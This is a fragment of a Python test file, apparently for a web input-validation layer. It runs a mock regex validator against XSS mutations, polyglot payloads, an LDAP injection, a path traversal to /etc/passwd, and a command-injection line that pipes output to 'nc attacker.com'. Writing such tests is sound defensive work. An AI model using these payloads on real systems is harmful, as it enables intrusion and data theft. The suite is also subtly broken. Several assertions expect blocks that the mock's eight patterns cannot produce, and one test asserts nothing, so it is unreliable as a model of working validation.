                self, input_data: Any, validation_type: str = "general"
            ) -> dict:
                """Mock input validation."""
                self.validation_calls.append(
                    {
                        "input_data": input_data,
                        "validation_type": validation_type,
                        "timestamp": time.time(),
                    }
                )

                # Simulate comprehensive input validation
                if not isinstance(input_data, str | int | float | bool | list | dict):
                    return {
                        "valid": False,
                        "error": "Invalid input type",
                        "input_data": str(input_data),
                    }

                if isinstance(input_data, str):
                    # Check for dangerous patterns
                    dangerous_patterns = [
                        r"<script[^>]*>.*?</script>",  # Script tags
                        r"javascript:",  # JavaScript protocol
                        r"on\w+\s*=",  # Event handlers
                        r"expression\s*\(",  # CSS expressions
                        r"data:.*base64",  # Data URLs
                        r"vbscript:",  # VBScript protocol
                        r"&#x[0-9a-f]+;",  # Hex entities
                        r"&#[0-9]+;",  # Decimal entities
                    ]

                    for pattern in dangerous_patterns:
                        if re.search(pattern, input_data, re.IGNORECASE):
                            return {
                                "valid": False,
                                "error": f"Dangerous pattern detected: {pattern}",
                                "input_data": input_data,
                            }

                    # Check length limits
                    if len(input_data) > 10000:
                        return {
                            "valid": False,
                            "error": "Input too long",
                            "input_data": input_data[:100] + "...",
                        }

                return {
                    "valid": True,
                    "sanitized_input": input_data,
                    "validation_type": validation_type,
                }

        return MockValidationClient()

    @pytest.fixture
    def polyglot_attack_payloads(self):
        """Polyglot attack payloads that work across multiple contexts."""
        return [
            # XSS + SQL Injection polyglot
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
            # JSON + XML polyglot
            '{"test":"<script>alert(1)</script>","xml":"<?xml version=\\"1.0\\"?><root><![CDATA[<script>alert(2)</script>]]></root>"}',
            # URL + HTML polyglot
            "javascript:alert(1)%22%3E%3Cscript%3Ealert(2)%3C/script%3E",
            # Command injection + XSS polyglot
            '; echo "<script>alert(1)</script>" | nc attacker.com 80; #',
            # LDAP + SQL polyglot
            "admin')(&(password=*))(|(password=*))",
            # CSS + JavaScript polyglot
            'expression(alert("XSS"))',
            # HTML entity + Unicode polyglot
            "&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;",
        ]

    def test_polyglot_attack_prevention(
        self, validation_test_client, polyglot_attack_payloads
    ):
        """Test prevention of polyglot attacks that work across multiple contexts."""

        for payload in polyglot_attack_payloads:
            # Test in different validation contexts
            contexts = ["html", "json", "url", "sql", "xml", "css"]

            for context in contexts:
                result = validation_test_client.validate_input(payload, context)
                assert not result["valid"], (
                    f"Polyglot payload should be blocked in {context} context: {payload[:100]}..."
                )

    def test_mutation_testing_for_validation_bypass(self, validation_test_client):
        """Test validation using mutation techniques to find bypass opportunities."""

        # base_payload = "<script>alert('XSS')</script>"

        # Generate mutations of the base payload
        mutations = [
            # Case variations
            "<SCRIPT>alert('XSS')</SCRIPT>",
            "<Script>alert('XSS')</Script>",
            "<sCrIpT>alert('XSS')</ScRiPt>",
            # Whitespace variations
            "< script >alert('XSS')< /script >",
            "<script >alert('XSS')</script >",
            "<\tscript>alert('XSS')</script>",
            "<\nscript>alert('XSS')</script>",
            # Encoding variations
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "\\x3Cscript\\x3Ealert('XSS')\\x3C/script\\x3E",
            # Alternative syntax
            "<script>alert`XSS`</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/.source)</script>",
            # Nested variations
            "<<script>script>alert('XSS')<</script>/script>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        ]

        for mutation in mutations:
            result = validation_test_client.validate_input(mutation, "html")
            assert not result["valid"], f"Mutation should be blocked: {mutation}"

    def test_context_aware_validation(self, validation_test_client):
        """Test that validation is context-aware and appropriate for different input types."""

        test_cases = [
            # URL validation
            {
                "input": "javascript:alert(1)",
                "context": "url",
                "should_pass": False,
                "reason": "JavaScript protocol in URL",
            },
            {
                "input": "https://legitimate-site.com/path?param=value",
                "context": "url",
                "should_pass": True,
                "reason": "Legitimate HTTPS URL",
            },
            # Email validation
            {
                "input": "user@domain.com",
                "context": "email",
                "should_pass": True,
                "reason": "Valid email format",
            },
            {
                "input": "user+tag@domain.co.uk",
                "context": "email",
                "should_pass": True,
                "reason": "Valid email with plus tag and country TLD",
            },
            {
                "input": "javascript:alert(1)@domain.com",
                "context": "email",
                "should_pass": False,
                "reason": "JavaScript injection in email",
            },
            # Filename validation
            {
                "input": "document.pdf",
                "context": "filename",
                "should_pass": True,
                "reason": "Safe filename",
            },
            {
                "input": "../../../etc/passwd",
                "context": "filename",
                "should_pass": False,
                "reason": "Path traversal in filename",
            },
            {
                "input": "file.exe",
                "context": "filename",
                "should_pass": False,
                "reason": "Executable file extension",
            },
            # JSON validation
            {
                "input": '{"valid": "json", "number": 123}',
                "context": "json",
                "should_pass": True,
                "reason": "Valid JSON",
            },
            {
                "input": '{"xss": "<script>alert(1)</script>"}',
                "context": "json",
                "should_pass": False,
                "reason": "XSS payload in JSON value",
            },
        ]

        for test_case in test_cases:
            result = validation_test_client.validate_input(
                test_case["input"], test_case["context"]
            )

            if test_case["should_pass"]:
                assert result["valid"], (
                    f"Should pass: {test_case['reason']} - Input: {test_case['input']}"
                )
            else:
                assert not result["valid"], (
                    f"Should fail: {test_case['reason']} - Input: {test_case['input']}"
                )

    def test_recursive_validation_attack_prevention(self, validation_test_client):
        """Test prevention of recursive validation attacks."""

        # Create deeply nested structures that might cause stack overflow
        deeply_nested_dict = {"level": 1}
        current = deeply_nested_dict
        for i in range(2, 1001):  # Create 1000 levels of nesting
            current["nested"] = {"level": i}
            current = current["nested"]

        # result = validation_test_client.validate_input(deeply_nested_dict, "json")
        # Should handle deep nesting without crashing

    def test_validation_performance_under_attack(self, validation_test_client):
        """Test validation performance under DoS-style attacks."""

        # Test with extremely long strings
        very_long_string = "A" * 100000  # 100KB string
        start_time = time.time()
        result = validation_test_client.validate_input(very_long_string, "general")
        validation_time = time.time() - start_time

        # Validation should complete quickly even for large inputs
        assert validation_time < 1.0, f"Validation took too long: {validation_time}s"
        assert not result["valid"], "Very long string should be rejected"

        # Test with many small inputs (flooding attack)
        small_inputs = [f"test_{i}" for i in range(10000)]
        start_time = time.time()
        for input_data in small_inputs:
            validation_test_client.validate_input(input_data, "general")
        total_time = time.time() - start_time

        # Should handle many inputs efficiently
        avg_time_per_input = total_time / len(small_inputs)
        assert avg_time_per_input < 0.001, (
            f"Average validation time too high: {avg_time_per_input}s"
        )
